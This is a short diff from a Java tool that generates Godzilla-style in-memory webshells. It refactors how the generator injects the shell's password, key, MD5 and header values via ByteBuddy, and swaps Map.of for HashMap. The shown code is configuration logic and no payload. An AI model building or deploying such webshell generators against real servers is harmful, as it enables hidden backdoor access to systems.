@@ -4,7 +4,7 @@ import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
 import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
 import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
 import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
-import com.reajason.javaweb.memshell.config.Constants;
+import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.GodzillaConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import net.bytebuddy.ByteBuddy;
@@ -12,7 +12,7 @@ import net.bytebuddy.dynamic.DynamicType;
 import org.apache.commons.codec.digest.DigestUtils;
 import org.apache.commons.lang3.StringUtils;
 
-import java.util.Map;
+import java.util.HashMap;
 
 import static net.bytebuddy.matcher.ElementMatchers.named;
 
@@ -52,15 +52,15 @@ public class GodzillaGenerator {
             builder = LogRemoveMethodVisitor.extend(builder);
         }
 
-        if (shellConfig.getShellType().startsWith(Constants.AGENT)) {
+        if (shellConfig.getShellType().startsWith(ShellType.AGENT)) {
             builder = builder.visit(
-                    new LdcReAssignVisitorWrapper(Map.of(
-                            "pass", godzillaConfig.getPass(),
-                            "key", md5Key,
-                            "md5", md5,
-                            "headerName", godzillaConfig.getHeaderName(),
-                            "headerValue", godzillaConfig.getHeaderValue()
-                    ))
+                    new LdcReAssignVisitorWrapper(new HashMap<Object, Object>(3) {{
+                        put("pass", godzillaConfig.getPass());
+                        put("key", md5Key);
+                        put("md5", md5);
+                        put("headerName", godzillaConfig.getHeaderName());
+                        put("headerValue", godzillaConfig.getHeaderValue());
+                    }})
             );
         } else {
             builder = builder.field(named("pass")).value(godzillaConfig.getPass())
